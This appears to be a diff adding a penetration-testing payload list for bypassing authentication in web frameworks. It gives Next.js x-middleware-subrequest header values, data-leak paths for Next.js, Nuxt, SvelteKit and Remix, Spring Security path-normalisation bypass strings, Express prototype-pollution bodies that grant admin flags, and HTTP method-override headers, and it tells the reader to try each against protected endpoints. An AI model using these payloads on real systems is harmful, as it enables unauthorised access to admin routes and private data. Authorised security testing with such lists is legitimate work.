@@ -1,0 +1,84 @@
+# Framework Middleware Auth Bypass Payloads
+# Usage: Test each header/path against protected endpoints
+
+## Next.js x-middleware-subrequest Header Values
+x-middleware-subrequest: middleware
+x-middleware-subrequest: src/middleware
+x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
+x-middleware-subrequest: pages/_middleware
+x-middleware-subrequest: pages/admin/_middleware
+x-middleware-subrequest: middleware.ts
+x-middleware-subrequest: middleware.js
+x-middleware-subrequest: src/middleware.ts
+x-middleware-subrequest: src/middleware.js
+
+## Next.js ISR/SSG Data Routes
+/_next/data/{BUILD_ID}/admin.json
+/_next/data/{BUILD_ID}/dashboard.json
+/_next/data/{BUILD_ID}/settings.json
+/_next/data/{BUILD_ID}/api/users.json
+
+## Nuxt.js Payload Leak Paths
+/_payload.json
+/admin/_payload.json
+/dashboard/_payload.json
+/settings/_payload.json
+/api/_content/query
+/__nuxt_error
+/api/_hub/
+
+## SvelteKit Data Leak Paths
+/__data.json
+/admin/__data.json
+/dashboard/__data.json
+/settings/__data.json
+
+## Remix Loader Data Params
+?_data=routes/admin
+?_data=routes/dashboard
+?_data=routes/api.users
+?_data=routes/settings
+?_data=root
+
+## Spring Security Path Bypass
+/admin;
+/admin;.css
+/admin;bypass=true
+/admin%3b
+/%61dmin
+/adm%69n
+/%2561dmin
+/admin/.
+/admin/..
+/./admin
+//admin
+/admin/
+/admin%00
+/admin%0a
+/admin%0d
+/admin%20
+/admin..;/
+/Admin
+/ADMIN
+/aDmIn
+/admin%23
+/api/..;/admin
+/admin;jsessionid=x
+
+## Django Path Variations
+/admin
+/admin/
+/admin//
+/admin///
+
+## Express Prototype Pollution
+{"__proto__":{"isAdmin":true,"role":"admin","authenticated":true}}
+{"constructor":{"prototype":{"isAdmin":true}}}
+{"user":{"__proto__":{"role":"admin"}}}
+
+## HTTP Method Override Headers
+X-HTTP-Method-Override: GET
+X-HTTP-Method: GET
+X-Method-Override: GET
+X-Original-Method: GET
